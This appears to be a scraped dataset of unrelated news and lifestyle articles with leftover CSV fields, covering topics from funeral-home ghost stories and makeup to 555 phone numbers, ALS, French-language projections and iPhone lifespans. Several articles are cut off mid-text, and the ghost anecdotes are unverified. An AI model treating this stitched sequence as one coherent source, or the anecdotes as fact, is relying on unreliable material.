So I asked my mom and dad about it and they said we never even buy that stuff. I’ve seen shadows lurking around in my newly remodeled room on the first floor. An interesting finding, while tearing out the floors/walls in the room upstairs… we found little toys for a boy to play with. And I assume it was that little boy’s toys who died in the fire :(. Here is the most creepiest thing about the house ever: my parents told me this like a year after we finally moved out of the haunted house. They told that my room on the first floor was a funeral showing room! The house used to be a funeral home..ugh. I know they were telling the truth because my dad reminded me that when we were remodeling the room, we found an old screen door on the right side of the room and another screen door on the left side of the room. It was set up for people to walk in and see the casket and then walk out. That’s how they ran things in older style funeral homes back then.”

#6: Buried alive

“I work at the funeral home in Ashland, Massachusetts [and one day] my boss heard moaning coming from the prep room. When he went in the room, the woman was barely (but still) alive!”

– Jamie Jacqueline Bordner via Facebook





#7: An old man and his cane

“There was an elderly man who came in to pick out his own casket. He told my father that he was terminally ill and that he had about a month to live. The man was very easy to please, he wanted a simple casket, simple sermon, a few songs and a few loved ones. He did how ever have one very strange request, he wanted to be buried with his cane on top of the casket. He explained to my dad that the men in his family that have died before him all were buried with their cane outside their casket. He made the joke that it was because he would need it when he woke up out of the casket and would go on a walk with Jesus. My father promised the man his wishes and the man left happy.

Sure enough about a month later the gentleman passed and his funeral went perfectly as planned. He had a sweet, simple service, with about 20 close friends and family, a few songs he picked out and his daughter sang a song to him. Fast forward about an hour after the funeral, and to the burial site. It was a nice little area with a handsome gravestone with an angel carved on it. My father gave very strict instructions to the grave digger that after the casket was put in the cane was to be placed on top, then the dirt is to be added. The man said he understood and my father left because he had to prepare for another funeral.

The next day a man from the cemetery came to the funeral home saying that he thinks someone left an item by the grave. It was the man’s cane! My father was so upset because he gave very strict instructions to the digger about the placement of the cane and told him the importance of it to the man. My father was very distraught because he felt like he failed the mans last wishes. My father took the cane to his office and was going to call the family and ask if they wanted to have it. And this is when it started. The cane was everywhere.

The cane would show up in all of the different rooms around the funeral home. We would see it hanging on door knobs, on chairs, leaning against walls, in the bathrooms, ON MY BED! We knew for a fact that the cane was haunted by the old man and he did not seem too pleased that he didn’t have his cane in his grave. (To be continued)

#8: Scared of the living, not the dead

“As I was pulling my charge out of the back of the removal van at about 2 in the morning, I saw three large men round the corner from the side of our mortuary building. I was working alone (in heels and a pencil skirt). The way our mortuary building, funeral home, garage, and prep area were set up, I was cornered. I left the body half in/ half out of the van, ran into our prep room, locked the door, and called the cops. I’m sure those guys were probably more scared than I was, once they got close enough to see what I had been doing! People ask if I’m scared of picking up dead bodies. I always tell them that it’s the living people that’ll hurt you, not the dead ones.”

#9: Playing with fire

This is an excerpt from the new homeowner of the formed Jacobs Funeral Home in Kokomo, Indiana who purchased the property in 2000:

“Many people that have worked here or rented have told me about hearing sounds and seeing black shadows during all hours. One of the things that has turned me to wonder about all this even more is the children saying things about a “black fog” in different rooms during the night.

It’s apparent that something is causing all this. Whispers in the hallways, lights going out and coming back on, leaving rooms with the lights off and seeing them turn on. Even water turns on and off. Finally when the people remodeling came to me and said something about a high pitch drilling noise from the basement one afternoon I told myself and my wife I’d humor everyone and speak with a local psychic. I did so the same afternoon of the drilling.

The psychic was a nice little lady but, I was frustrated that all she kept saying and insisting to me was that I shouldn’t remodel and stir up the spirits in the building and I’m causing nothing but problems some people in the community would choose to forget. It was a creepy thing to say I thought and it really wasn’t what I wanted to hear from her. She didn’t help and what she told me, I didn’t feel was what I was calling her about but, either way she refused to come over and answer questions about black figures in this building for me and she kept on and on about stopping what I was doing to the building. Before the phone call ended I remember very well the last thing she said, “You sir are playing with fire”. Whatever that means but, it stuck with me.

So after a few days I called a local Christian preacher who prayed for me and claimed I was involved in a demonic process and should come to church Sunday morning before it’s too late. He did finally come over to the building and did some water sprinkles of whatever it’s called around the place but, when he left everything started freaking out. Lights would turn off and on and we started getting light headed sometimes when we walked through areas of the building. So now every since that day my wife won’t stay in a room alone when we are here. We still really don’t have any clear answers on the building, the items inside, or it’s terrible history but, after we finish remodeling we hopefully clean and rid ourselves of the spirits of Jacob’s Funeral Home. We hope by getting rid of the items we are unearthing that the spirits will go with them to people who can help them. If you’d like to be involved you can look for all the items we find here at the funeral home to be placed on eBay for auction.”

– Property owner via Jacobs Funeral Home website





#10: The other occupants

“Most nights as we were returning to quarters from a run, my partner and I would scope the parking lot for vagrants or people that shouldn’t be there before we opened the bay doors. While looking on more than one occasion, we would see a light on in the adjacent building on the top floor. There should have been no lights on. Figuring someone had gotten inside, we would watch the building for more lights. No other lights ever came on, but on every occasion a young woman in a dress would come to the window and stare at us.

One night, after seeing the figure, we got brave and called some law enforcement friends from the area to help us search the building. We went to the room that had the light on expecting to find a vagrant camped out there. The only thing we found was a room that had untouched dust on the floor and no light bulbs in the sockets. We got the willies and split. We never went back into that building at night.”

In the battle of makeup types, which type reigns supreme? Here’s my personal makeup confession: I buy almost all of my beauty products from department stores or high-end retailers. The extra cost is justifiable because I work from home, I mostly reserve my pricey makeup for special occasions, and the products last for months. As I’m darting out of the department store, the highly saturated pigments of lipsticks and blushes capture my attention. Plus, I’m lured in by the promise of a mascara that won’t flake or a high-shine lip gloss that creates the perfect pout. At different times in my life, though, I’ve used my fair share of drugstore cosmetics. In my college years, the price point of drugstore brands was more affordable to me, and I loved experimenting with the newest products on the market. If I had any issues with an item I’d purchased, I could easily exchange or return it. But somewhere along the line, I stopped using drugstore makeup altogether, and I began to believe the best cosmetics came from high-end retailers. In my search to find quality beauty products, was it necessary for me to switch from drugstore makeup to high-end cosmetics? Or could I have found great products at both price points? To compare these two makeup categories, I spoke to several experts—a cosmetic chemist, a geneticist, a pharmacist, and a makeup artist—to gather insights across a variety of cosmetic specialties and find out the differences between drugstore makeup and high-end makeup. Suffice to say, it might be worth revisiting the products you’ve been using—after all, you may find some items are worth the splurge and others are worth the save.

All ingredients aren’t created equal.

Soraya Ali-Hope has some knowledge about the cosmetics industry; she’s worked in it for 34 years. “All ingredients are not created equal,” says the president, founder, and cosmetic chemist for the Octagon Marketing Group, which helps producers formulate cosmetics. “Raw materials can be sourced from different countries and may be extracted from natural sources or synthesized in the laboratory.” In general, the mass-market brands like CoverGirl or Revlon incorporate more synthetic and less expensive ingredients into their products. On the other hand, high-end products, like MAC or Bobbi Brown, often have premium formulations, higher quality ingredients, more pigment, and include more costly technologies in the creation of those products. Ali-Hope says high-end makeup brands regularly utilize “advanced chemistry for both liquids and dry powders.” Frequently, high-end makeup has cleaner ingredients, fewer fillers, and a range of shades to suit your skin’s individual needs, and they may have a performance advantage over their drugstore “dupes” (less-expensive products that are similar to high-end versions). Additionally, many drugstore lines have professional makeup artists test and promote their products after they have launched in store. With high-end cosmetics, it’s not uncommon for them to have artists involved in the formulation of each collection from start to finish.

The quantity of the ingredients varies.

Do two products that purportedly contain the same active ingredients perform the same? Not necessarily. Consumers may not be aware that companies will promote their products as containing particular ingredients…while the quantity of those special ingredients vary among brands. Therefore, you might not get the same beneficial results from one product to another. “There are definitely differences in ingredients and formulations for high-end brands over drugstore brands, particularly in the clinical quantity used in the formulations,” explains Neal Kitchen, chief geneticist and COO at makeup brand HydroPeptide. “Peptides (short chains of amino acids) are a great example of ingredients where the type of peptide and the quantity of the peptide are both essential for how effective the ingredient will be on your skin.” Two brands could market the same ingredient but have significantly different results on the skin, explains Kitchen, if one brand is using it for marketing purposes rather than the clinical impact.

It’s a case of convenience versus performance.

Peter Matravers, PharmD, chief scientific officer for makeup seller Arbonne, explains the uses for high-end and drugstore brand makeup. “For daily maintenance, functionality, and simple needs, I would say stick to mass-market brands if budget is an issue. Not all of your products need to be premium,” he says. “Beyond general maintenance,” he continues, “you want to be aware of your specific needs that would benefit from premium, more performance-based formulas that deliver better results.” Don’t go running off to high-end retailers just yet! At the end of the day, there seems to be a place for both drugstore and high-end cosmetics in your makeup bag. Drugstore brands formulate their products with affordability in mind. High-end products, on the other hand, are formulated to better suit an individual’s preference and goals, meaning the products serve more specific functions in your beauty routine.

What does the makeup artist have to say?

Chicago-based makeup artist, Vanessa Valliant from Valliant Beauty, says, that high-end products “tend to have a better range of classic colors for customers. While they may showcase a certain collection each season, they aren’t solely focused on trends. However, drugstore makeup brands love to pour out every trendy color that hits the market each season.” Valliant—whose customer base includes celebrities, brides, fashion models, and everyday women—primarily favors high-end makeup brands due to their consistent formulations and wide range of pigments for each skin tone. Drugstore brands, though, have the advantage when it comes to price point and experimentation. They can also be helpful when trying out new products (like the latest matte lipstick or a metallic eyeshadow you’ve been curious about) without committing to a higher cost. Although not all ingredients are created equal, Vaillant says it’s all about the application of the makeup that can make or break your look. “Anyone can take drugstore or high-end makeup and blend them to perfection on the skin, achieving an overall, amazing makeup look,” she says. “There are a few high-end makeup lines that have more longevity due to their waterproof ingredients. But for the most part, with the proper application, you can achieve longevity out of both drugstore and high-end cosmetics.” Valliant tells her clients that there are some products worth the extra investment; additionally, she tells them there are drugstore items that work well and won’t cost them a small fortune. Ultimately, the choice as to which makeup is right for you depends on your skin’s needs, the goals you have for the product, your likes and dislikes when it comes to specific cosmetics brands, and your budget.

So, when should you splurge? When should you save?

Splurge

Valliant recommends buying skincare products, foundation, a well-made set of brushes, and lipstick from high-end brands. “Beautiful makeup begins with healthy skin. I love a good skincare line like Kiehl’s because your skin is the largest organ, and it must be hydrated daily. Plus, they have a wide range of products to fit your skin type,” she says. “Also, it’s important to spend a little extra money on foundation … because it tends to perform better on the skin, and it’s created to mimic the look of real skin. My personal choices for foundations and concealers are by Tom Ford and Dior.” For brushes,” she continues, “I like NARS. Well-crafted brushes last longer; they’re softer on the skin and are more tailored to specific areas of the face. Lastly, purchase your lipsticks from a high-end brand like Bobbi Brown. There are many colors and textures to choose from, and they’re designed for a variety of skin tones. You can’t go wrong with a lipstick like that!”

Save

Valliant suggests purchasing mascara, eyeshadow palettes, blushers, highlighters, and eye pencils at the drugstore. “Maybelline mascara is hands down the best mascara on the market—you’ll find one in every professional makeup artist’s kit,” she says. “If you’re looking for the latest trends, NYX carries the latest eyeshadow palettes, blushes, highlighters, and eye pencils. Nowadays, you can find a wide range of products to fit your budget and needs at most drugstores.”

What’s our takeaway: Drug Store or High-End Makeup?

Regardless of whether you prefer drugstore cosmetics or high-end makeup brands, it’s important to focus on what best suits your skin’s needs, from the price point to the wearability of the product. In the long run, the makeup brands that are right for you are the ones that nurture your skin and help you look and feel your best—regardless of the differences in how they’re made or where you bought them.",The Differences Between Drugstore Makeup And High-End Makeup,

But everyone who has ever looked at a sub, even those of us so enamored with the underwater beasts that we sleep in custom-sewn adult-sized submarine pajamas, has at some point wondered: If the boat goes down, is there any way out?

Yes! Escape plans and tools are almost as old as submarine technology itself. Although the odds may always be stacked in favor of the merciless, cold depths of the sea, a few dozen lucky people have taken that unintentional ride down to the ocean floor and lived to see daylight again. Their stories teach us how to get out.

Adapted from In the Waves: My Quest to Solve the Mystery of A\a Civil War Submarine, by Rachel Lance. Buy on Amazon. Courtesy of Dutton

In 1851, German submarine inventor Wilhelm Bauer looked at two of his panting countrymen, slumped inside the hull of his creation. The boxy, 26-foot-long, human-powered early sub model was supposed to help win the ongoing war with Denmark, Germany’s neighbor to the north, but the odds of its successful use were looking grim. The crew of three had been trapped inside the submarine for hours, sitting and waiting for rescue.

The test day in Germany’s Port of Kiel had started normally. The men had crawled, as usual, through the hatch in the angular conning tower above the bow and taken their places: Bauer at the controls, and Witt and Thomsen each standing at one of the two massive hamster wheels that powered the boat’s propeller. Bauer gave the command. Witt and Thomsen lifted their legs and began to step on the spokes of the wheels, spinning them slowly like a giant human-powered waterwheel. The submarine began to move forward.

Bauer expected a graceful and smooth disappearance beneath the surface of the water, like an elegant metal seal. Instead the Brandtaucher (“Fire Diver”) plummeted unexpectedly, caroming wildly in an awkward, unstoppable, and rapid descent into a depression in the harbor floor that was 16 meters deep. As she crashed into the seafloor and shuddered to a final stop, the three men were hurtled unceremoniously into the bow of the boat. They pieced themselves together, shaken but uninjured. However, Bauer, Witt, and Thomsen slowly came to the realization that they couldn’t get the boat out of the hole. They were stuck.

At first, they just waited. And waited. For at least five hours, according to them, they sat, wondering when rescue would come. Their dive had been witnessed by onlookers; they figured it was just a matter of time until the German Navy hauled them back up to safety and fresh air. Someone had in fact noticed, and eventually the clanking of chains and anchors on the hull indicated that boats and divers were poking around the wreck site. But Bauer was growing concerned about the air … and the anchors.",How to Escape From a Sunken Submarine,

Victoria Schild was not planning to buy any pets that day but after noticing this abandoned fish at the back of a store, she knew that she has to rescue him. “I felt incredibly sad for the little guy and decided that I didn’t want him to die in there, just rotting away,” Schild told The Dodo, “I was 95 percent sure he was going to die that night.”When she brought him home she was worried that he had only hours to live, but she was not willing to give up. Victoria did everything within her power to save this little fish. “When I got home, I started researching everything that I possibly could to help him recover, and probably within a week of clean warm water, medicine and basic care he started getting better!”

After that, his condition improved enormously – his tail began to regrow and his fins returned to normal. After weeks of medication, this little guy transformed into a beautiful, healthy fish!

Schild named him Argo, in homage to his glorious, sail-like fins. Victoria hopes that Argo’s story will bring awareness to the conditions that these fishes are being held in at stores. Scroll down to see Argo’s incredible transformation!

When he shakes your hand, you feel it. Arnie is still a giant man, even at 70. He's big in stature and huge in personality.

The former Governor of California and star of — well, you know all his films — touched down in Melbourne on Friday for a charity fun run, a sports festival named after him and ... a spot of chess, apparently.

""When you're playing chess, you cannot think about anything else otherwise you get beaten,"" he says.

""You have to stay focused every second. It's a really great form of disconnection from everything else.""

It's part of his routine and it keeps him sharp mentally. But you don't still look like The Terminator in your eighth decade on the planet without shifting a bit of tin.

""I lift all the time, I go every day to the gym,"" he told news.com.au on the first day of the Arnold Sports Festival at the Melbourne Convention and Entertainment Centre.

""I bicycle, I lift, I ski, I do everything else.""

The surprising thing isn't that he still works out, it's the sheer amount he gets done before most of our alarms go off — and before we snooze them three or four times.

""I work out every day, I get up at 5am and I ride the bike to the gym. I work out there for an hour then I ride home and have breakfast. My day starts like that. Before I ever get to the office, I've already done my workout for the day. I've done something.""

He knows staying in shape isn't easy, but there's a trick to it. ""Don't think"". Simple, right? Arnie explains: ""(Working out) is not just difficult to do in the beginning. It's always going to be difficult. I say to people, 'don't think'.

'Just get up, get on your bicycle, ride the bike, then start thinking. Because as soon as you start thinking, you will have 5000 reasons why you shouldn't do it.'

""I'm in such a routine now that I don't even ask myself, 'should I or shouldn't I'.""

If you've ever watched Pumping Iron, the 1977 documentary about Schwarzenegger's quest for a sixth consecutive Mr Olympia title, you'll know lifting for him was never a chore. He loved it. He loved the pain and he chased ""the pump"" fanatically.

(He'd go on to win seven Mr Olympia titles, a feat only bettered by behemoths Lee Haney and Ronnie Coleman, who won eight apiece).

These days Schwarzenegger still finds ways to compete, even if his body can't do what it once could.

""I'm kind of competing all the time but it's in different things,"" he said on Friday.

""I left body building, then it was competing in the box office with my movies, then you compete when you run for governor ... it's always a competition one way or the other, I thrive on that.

""The key thing is you have a very clear vision of where you want to get then you just follow through with the whole thing.""

This weekend he'll tour Australia's largest fitness expo where 10,000 professional and amateur competitors will take on events from Strongman to MMA. Some giant athletes who Arnie says can lift 450kg will try their luck pulling a tank for fun. An. Actual. Tank.

movies

It has a lot to do with the way telephone numbers evolved over time.
BUSINESSINSIDER.COM
",19/03/2018 21:31,https://www.businessinsider.com/555-phone-number-tv-movies-telephone-exchange-names-ghostbusters-2018-3,"When TV shows and movies need to use a phone number as part of the story, they typically use one that starts with 555. We spoke with an official historian at AT&T to find out why these three numbers were chosen.

It turns out that the answer has a lot to do with the way telephone numbers evolved over time. Following is a transcript of the video.



""Pick up your phone and call the professionals: Ghostbusters.""



Narrator: Did you ever wonder why phone numbers in TV shows and movies always start with the numbers 555?

555-1125.



It's 555-3455.



555-2401.



Narrator: The short answer is that most 555 numbers are not working numbers, so real people won't be harassed if diehard fans try to call them. 555 was an exchange combination that was not used very often in the American telephone system.



You may get a wrong number, or no number at all.



Narrator: An FCC contractor called the NANPA, or North American Numbering Plan Administration, is tasked with assigning numbers for use. 555-1212 is still used for directory assistance and 555-4334 is reserved for assigned national use. But a set of 100 555 numbers have been officially designated for use in Hollywood, 555-0100 through 555-0199.



Cory Gillis, 555-0176.



Narrator: Back in the early '90s, 555 numbers outside that range could be reserved for information service providers, but this program was shut down by the NANPA in 2015. While those other numbers might one day be put back in circulation, the 100 reserved for TV and movies will not, so they will always be safe for use.

So, how specifically did 555 become the famous number that it is today?



Decades ago, phone numbers used to look a lot different. They consisted of a word and a five-digit numerical code. The word was a telephone exchange name, and the number was assigned to a specific phone in that area.



Sheldon Hochheiser: Up until 1919, all telephone calls were manual. You had to start by speaking to an operator.



This is WY 5-2240.



Narrator: References to this system can be seen in the names of movies, like ""BUtterfield 8."" And songs like the Glenn Miller Orchestra's ""PEnnsylvania 6-5000,"" which calls hotel Pennsylvania in New York.



Hochheiser: These were based on names that could be easily understood verbally.

Narrator: Eventually, phone companies switched to a system where customers had to dial themselves.



We are changing your telephone service over to dial. Take up your receiver, and always listen for the dial tone.



Narrator: Phone numbers were reached using numbers corresponding to the first two letters of the exchange name. So if you wanted to call Pennsylvania 6-5000, you would dial 73-6-5000. Since seven corresponds with PQRS on the keypad, and three corresponds to DEF. For Butterfield, you would start with 28.

So, with this in mind, let's take another look at 555.



Hochheiser: Now, some combinations for the first two letters of a word worked better than others. One of the combinations that were very difficult to correlate to useful exchange names was 55.



Narrator: On the keypad 5 has the letters JKL. Letters, which when placed next to each other, don't make many words or exchange names. So there were not many real phone numbers starting with 55.



Hochheiser: Klondike, which has become well known, is about the only one.



Klondike 4-2106, Los Angeles, please.



Then call Klondike 5-3226.



Narrator: These numbers were often shortened to just the first two letters plus the five-digit code. Since Klondike 5 was not frequently assigned, it found other uses. Bell systems noted in an official guide that the 55X exchange was reserved for ""radiotelephone.""



The portable transmitting and receiving radio unit that makes it possible to combine radio and wire telephony for communication purposes.



Narrator: This was actually a very small group of numbers used in early mobile phones. Klondike 5 was also a sample number used in old phone-company advertisements, and it began to be used in old movies and TV shows. Eventually, area codes were introduced allowing for more available phone numbers, and the exchange names were abolished, but the 555 trope is still used today in Hollywood.



What's the phone number of this store?

555-2310.



Narrator: So, if you're looking for a Ghostbuster, who ya gonna call? No one.",Why 555 is always used for phone numbers on TV and in movies,

A small study conducted by the University of Cambridge in England surveyed 276 people about their foul-mouthed habits. People were asked about their favorite swear words and how often they use them. They were later asked questions about how often they attempt to shift blame to others, cheat at games or “try to take advantage” of others.

According to the data the scientists collected, those who swore the most tended to also lie the least. Co-author of the study David Stillwell says it comes down to socialization.

“There are two ways of looking at it. You might think if someone is swearing a lot, this is a negative social behavior,” Stillwell told The Daily Mail in an interview. “On the other hand, they are not filtering their language so they are probably also not putting their stories about what is going on through similar filters which might turn them into untruths.”

A second, much larger study that was accepted for publication in the journal Social Psychological and Personality Science garnered similar results.

Studying 74,000 Facebook users, researchers compared curse words to language that typically accompanies truth-telling. Researchers compared how often people used profanity and words such as first-person pronouns like “me” and “worried.” In the end, their research showed that people who edited their language online also attempted to look cooler, despite having to bend the truth to do so.

In the UK, where Hawking was born, it’s called motor neurone disease (MND).

ALS attacks the nerves that carry impulses from the brain and spinal cord to the muscles throughout your body, causing them to degenerate and die. This affects the ability of these muscles to perform the voluntary movements needed for walking, talking, chewing, lifting objects, and more. When the muscles no longer receive the messages to move, they begin to weaken, twitch, and waste away (atrophy), according to the National Institute of Neurological Disorders and Stroke (NINDS).

""The disease robs the whole body of all active movements we make to do daily tasks,"" Lucie Bruijn, chief scientist at the ALS Association, told BuzzFeed News. In some cases there may also be cognitive impairment or dementia, Bruijn said, but many people with ALS (like Hawking) do not have changes in their ability to think.

Most people who get ALS are between the ages of 40 and 70, and it can affect anyone regardless of race, ethnicity, and socioeconomic status. Doctors do not know what causes ALS and there is currently no cure, although some treatments and technologies may help manage symptoms.",Stephen Hawking Lived For Over 50 Years With ALS.

Queen Elizabeth gave her formal consent for Prince Harry to marry Markle on Thursday, March 15th, in the process reminding the world of both Harry and Meghan’s real names. As we often forget, Prince Harry’s given name is actually Henry, and Meghan Markle’s real name is…Rachel?

“My Lords, I declare My Consent to a Contract of Matrimony between My Most Dearly Beloved Grandson Prince Henry Charles Albert David of Wales and Rachel Meghan Markle,” Queen Elizabeth wrote via a letter from Buckingham Palace, “which Consent I am causing to be signified under the Great Seal and to be entered in the Books of the Privy Council.”

No, the queen is not misremembering Meghan’s name. She’s just being as formal as the situation requires. As fifth in line to the throne, Harry needs official permission from his grandmother, ruler of the Commonwealth, to marry under the Succession to the Crown Act, and it’s only natural Queen Elizabeth granted that permission using both parties’ full legal names.

Though the world knows the future royal as Meghan, it’s actually her middle name. Markle traded it for her first name, like many actors and actresses in Hollywood (Karen Lucille Hale, David Jude Law, and Christopher Ashton Kutcher come to mind). And, as Suits fans will remember gleefully, Markle’s real first name matches her Suits character’s name, Rachel Zane.

If you had no idea about Meghan — er, Rachel’s — real name, don’t fret: Neither did we. Until further notice, we’re going to go right on calling her Meghan to save us all the confusion.","Meghan Markle's real name isn't actually Meghan, and how did we not know this?!",

Correction: An earlier edition of this story incorrectly spelled the name of a former French colony, and listed a country that is not in Africa.

The French are a proud bunch, especially when it comes to their mother tongue. So it must have been hard for them to take a backseat and watch English become the lingua franca of the 21st century.

But revenge could be on the horizon: The language beloved by Parisian poets, Russian aristocrats and pretentious grad students is set to reclaim its title when it becomes the world's most commonly spoken language by the year 2050, according to a study by Natixis, an investment bank.

The language beloved by Parisian poets, Russian aristocrats and international diplomats is set to reclaim its title.

French is currently ranked sixth among world languages, after Mandarin Chinese, English, Spanish, Hindi and Arabic. But it is gaining speakers quickly and, the study reports, will be spoken by 750 million in 2050, up from 220 million today.

Forgetting to speak Russian

From colonies to creditors

C'est possible? English enjoys an indisputable global popularity, and Mandarin has long been touted as the language of the future, given the size of China's population and its growing economic power, but French has a demographic ace up its sleeve: French-speaking populations are growing faster than English- and Mandarin-speaking ones.

Besides France and its best-known former colonies, Morocco, Tunisia and Algeria, the language of Molière and Manet is spoken in 28 other states — which happen to be some of world's fastest-growing nations. In Africa, French is the official schooling language of countries with increasingly high fertility rates like Mali in the north, and Guinea, Chad and Democratic Republic of Congo in the sub-Saharan region.

A demographic boom in these African states could bump the world's percentage of French speakers from 3 percent today to 8 percent by 2050.

French-speaking populations are growing faster than English- and Mandarin-speaking ones.

Meanwhile, China and many English-speaking countries are likely to experience a demographic slowdown, which could lead to an expected decline in the number of English speakers — from 8 percent to 3 percent of the world's population. For Mandarin, a drop from 10 percent to 8 percent is anticipated.

While this sounds like cause for celebration for Francophiles who might cringe at the notion of studying Mandarin, it's not time to pop open the Dom Perignon quite yet. Some skeptics think the predictions are overstated.

The study labels all the citizens of the states where French is the official language as ""French speakers,"" which is not strictly true. Countries like Belgium, for example, have more than one official language and, in some African nations, the tongue of the former colonial power is losing ground. Even in Algeria, only a third of the population can write in French.

""The number of people who speak French continues to increase, and the projections are indeed impressive, but they do not take into account the coexistence of languages, which is the reality in many countries,"" says Alexandre Wolff from the Observatory of the French Language.

So while French is on the rise, it may be a while before it can challenge the hegemony of English or the growing appeal of Mandarin Chinese. Which makes it a good time to dust off your old French phrasebook — but don't bid adieu to those Mandarin lessons just yet.

Jasper Behrends went against all advice from his teachers to abandon his
‘inappropriate’ art and was rewarded in the best possible way in the end

GAYSTARNEWS.COM
",21/09/2017 15:52,https://www.gaystarnews.com/article/teacher-snubs-trans-teens-art-project-happens-next-amazing-jasper-behrends/,"Jasper Behrends is a trans teenager who lives in northern Virginia and just graduated from high school in June.

As part of his art course, he had to devise a specific subject for his work, as well as a theme. His official concentration statement was: ‘How the people in my life relate to their gender and sexuality, especially in regards to body dysphoria.’

But then his art teacher thought it might be a little ‘inappropriate’ and what happened next is amazing. A viral tweet captured the internet’s attention and the rest is history.

Gay Star News asked Jasper to give us a rundown of how exactly it all played out.

How long have you been doing art?

I’ve been doing art for as long as I have been able to hold a crayon.

Ever since I was a kid, art has always been an outlet I use to express myself. It helped me through my parent’s divorce, it helped me through my depression and anxiety, and it’s now helping me through my transition and self exploration.

Your school’s administration told you to stop doing art that plays with gender and sexuality because it’s ‘inappropriate’ – how did this conversation go?

For those who don’t know, the AP Studio Art course is separated into two different segments: the Breadth section and Concentration section.

In the Breadth section, the student must show their range as an artist and mastery of space, shape, form, color, pattern, etc. In the Concentration section, the student gets to pick a specific subject and do an in depth study on it.

Each section contains 12 pieces and a complete portfolio is 24 pieces.

My official concentration statement was ‘How the people in my life relate to their gender and sexuality, especially in regards to body dysphoria.’

After starting my concentration, the school vice principal came to me after my art teacher informed the administration about my ‘potentially sensitive’ concentration subject. He said that although he had ‘no problem’ with the LGBTI theme, there is a ‘time and a place’ for ‘these things’ and that it did not belong in public schools.

He constantly reaffirmed to me that he ‘fully supported’ the LGBTI community, but made it blatantly clear that I could not bring it into the school.

I asked what specifically about it was ‘inappropriate’ because, at this point, I had only made one piece (Disconnection, which can be found on my website).

He told me that it was the nude breasts.

I told him that that was ridiculous because I had drawn tons of boobs in my breadth section and no one had even raised a finger. I also cited portfolios of students in the past who did things with nudity that weren’t forced to change their subject.

He claimed that the reason I couldn’t do my subject was because it ‘didn’t follow the school dress code’ and ‘just like how I can’t let a student walk in shirtless, I can’t let you do this stuff.’

Although I didn’t agree that art and school dress codes should be policed on the same level, I understood that this was obviously a risque topic.

I tried to compromise.

I asked: ‘Okay, so I can’t draw breasts. Can I draw shirtless guys though?’

Again citing the dress code, he said no.

The vice principal said that if I could tone it down, if I could make it more metaphorical, if I could make it so that the subject of transgender themes were ‘inferred’ and not so blatant, that I could continue.

‘But if I do that,’ I retaliated, ‘the entire theme of body dysphoria would be lost. This might make you feel uncomfortable, but it’s the everyday life of a transgender person. The point of this study is to show the raw, intense feelings of dysphoria.’

Why didn’t you stop and why do you think it was important to continue your art project on gender and sexuality?

After being shot down, I told my art teacher that I would rather just not turn anything in than switch my concentration or ‘make it less intense’ to suit those who might not be accustomed to being exposed to queer art.

My teacher, knowing that I was serious, told me that I should at least TRY to dull it down.

After a lot of arguing, I just decided to ignore everyone and keep doing it.

I just kept making art and didn’t listen to the administration.

I wasn’t able to put my work in any of the school art shows, I wasn’t able to even show my parents, but I was proud of what I was doing.

When you submitted the artwork, you got selected for the state’s Studio Art Exhibit! Can you outline what it’s all about?

Last year, I believe 34 students were chosen to be shown in the exhibit. To be chosen is a great honor considering there are thousands of AP Studio Art students — I asked my teacher how many, she said that there are roughly 15,000 students.

I got a five and that is a perfect score. The AP Art course is scored on the same scale as all other AP tests. For each portfolio, three different officials score each section on a one-five scale and then the scores are averaged together.

This is from the College Board website:

‘This exhibit showcases outstanding artwork created by students who submitted portfolios for the AP Studio Art Exam. Each work exemplifies the extremely high level of rigor, commitment, and accomplishment that AP Studio Art students can achieve. AP Studio Art students work with diverse ideas, materials, and processes to create art.’

What are you planning in the future?

Having graduated high school and Monroe Technology Center — a STEM school where I studied filmmaking — I start college at Virginia Commonwealth University next month where I plan to double major in English and cinema production.

I plan on taking the artistic skills that I have and apply them to my film career.

Will you continue making ‘inappropriate’ art?

I will definitely keep creating queer art. It’s literally the only type of art I truly enjoy doing.

Art is just materialized passion, and my passions stand with the queer community.

So if I’m spending over $1,000 on an iPhone, how long should I expect to use it for?

Smartphones have never had the longevity that modern computers have, often staying current for only two or so years. There are a good number of reasons why: For one, smartphones are historically cheaper, so it makes sense that companies would expect them to be replaced a bit sooner. But more importantly, smartphones are evolving at such a rapid pace that there’s frequently a good reason to buy a new phone every couple of years.

Sometimes, this is a good thing: in the last two years, many phones have added second cameras, much better image processing, HDR displays, and the increasingly universal USB-C connection standard — all reasons you might want to buy one. But other times, the continued improvements lead to big issues for people who’d rather not upgrade so often: after a couple of years, apps just tend to get slow. And often, unusably slow.

Phone processors are improving at a rapid pace

Like other smartphone features, processors are improving at an incredible pace — sometimes dramatically from year to year. And with developers routinely targeting the latest and great smartphones in order to make their apps capable of doing more than ever, people who don’t keep buying new smartphones may be left with a sluggish experience after only a couple of years.

The situation hasn’t gotten that much better. My iPhone 4S was getting hard to use after just two years. And while my iPhone 5S was still in relatively good shape after two years, its age was starting to show as I loaded up newer versions of iOS. This problem isn’t exclusive to iPhones either — my current phone, a Nexus 5X made by Google and LG, has become painfully slow when taking photos less than two years on. I haven’t owned newer iPhones, but I’m told they still start to see the same battery life and sluggishness issues past the two year mark. That’s not a huge surprise: we put a ton of wear and tear on these things, while technology is racing ahead.

So will the iPhone X buck all of that and last buyers longer into the future? I’m not so sure that it will. The iPhone X uses the same processor that’s inside of the iPhone 8, and there’s no doubt that Apple will release a new phone next year with an even faster processor, and same with the year after that. Even though the iPhone X has more advanced cameras and a future-facing design, the processor is going to age just as fast as every other iPhone.

There’s almost an implication here that the iPhone X isn’t built to last. At $999, this is a phone for tech enthusiasts and people with large amounts of disposable income, who will buy this in part to have the flashiest phone they can get — its distinctions are not meant to help pros who need more technical capabilities, after all; they’re largely aesthetic improvements and entertaining flourishes. If Apple releases an X2 next year (or maybe an XI?) and the X is no longer cutting edge, I suspect this same group of people will consider buying yet another iPhone.

For a more typical smartphone customer, who might like the idea of splurging on an iPhone X but doesn’t replace their phone every year, that isn’t a tenable proposition. And the idea that a $999 phone might age just as fast as a $699 phone — the price of the iPhone 8 — is to me, at least, quite frustrating. It doesn’t seem unreasonable to expect such an expensive device to last more than a couple of years.

You now have a choice of how much to spend and how often

This rapid aging wasn’t as much of an issue back when we were all (in the US, at least) locked into two-year contracts with our phone carriers, and most of the price of a new smartphone was hidden away — it just made sense to upgrade if you had the means.

In fact, you used to be discouraged from holding onto a phone for longer than two years. Phone carriers like Verizon and AT&T hid a device fee inside their monthly bills, which covered the cost of the subsidized phones they gave out. Keeping a phone for longer than your contract period meant you’d be paying for a new device even as you were using an old one. (This also means that slow upgraders may well have already paid more than $1,000 for a phone, simply by losing the money to hidden fees.)

